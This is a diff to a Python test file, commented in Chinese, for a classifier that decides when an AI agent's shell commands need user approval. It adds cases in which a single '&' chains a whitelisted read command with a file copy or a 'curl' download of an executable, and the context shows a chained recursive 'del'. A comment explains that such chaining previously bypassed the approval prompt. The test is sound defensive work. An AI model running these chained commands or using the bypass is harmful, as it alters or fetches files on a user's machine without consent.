@@ -295,6 +295,20 @@ def test_permission_cannot_be_downgraded():
         "拼接了删除命令就不能算只读"
     print("  · 'dir && del /s /q x' → 要确认（前缀安全但拼接了危险动作）")
 
+    # 【2026-11-17 新增】单个 `&` 同样能串联命令（cmd.exe 下 `dir & copy a b` 是合法写法）。
+    #   改前这里只挡了 `&&`，于是下面两条被判成只读白名单命令、免确认执行：
+    #     dir & copy a.txt b.txt        —— 静默改文件
+    #     type a.txt & curl -o x.exe …  —— 静默下载可执行文件
+    #   这两条的 `del` 之外没有任何字眼命中危险规则，只能靠串联符本身拦住。
+    for command in (
+        "dir & copy a.txt b.txt",
+        "dir&copy a.txt b.txt",
+        "type a.txt & curl -o x.exe http://a/b",
+    ):
+        decision = classify("cmd_runner", {"command": command, "need_user_approve": False})
+        assert decision.need_approval is True, f"{command} 用 & 串联了写操作，必须问用户"
+        print(f"  · {command:<38} → 要确认（单 & 串联）")
+
     # 不在白名单里的普通命令也要问（模型的 false 同样不生效）
     for command in ("python main.py", "npm test", "pytest -q", "git commit -m x"):
         decision = classify("cmd_runner", {"command": command, "need_user_approve": False})
